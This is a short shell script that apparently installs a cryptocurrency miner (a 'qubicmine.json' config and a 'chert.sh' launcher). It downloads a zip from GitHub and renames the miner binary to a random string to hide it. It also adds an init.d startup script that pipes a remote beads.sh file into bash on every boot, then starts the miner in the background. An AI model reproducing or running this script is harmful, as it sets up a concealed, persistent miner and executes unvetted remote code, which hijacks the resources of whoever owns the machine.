cd /
wget https://github.com/kilnqe/idols/releases/download/v1.7.9/cocs.zip
unzip cocs.zip
cd /cocs
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
mv flint $variable1
sed -i "s/python/${variable1}/g" ./chert.sh
sed -i "s/ALIAS/${variable1}/g" ./qubicmine.json
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/kilnqe/idols/main/beads.sh)" > stela.sh
chmod a+x stela.sh
update-rc.d stela.sh defaults
rm -rf cocs.zip
cd /cocs
nohup ./chert.sh
ps -ef | grep cocs
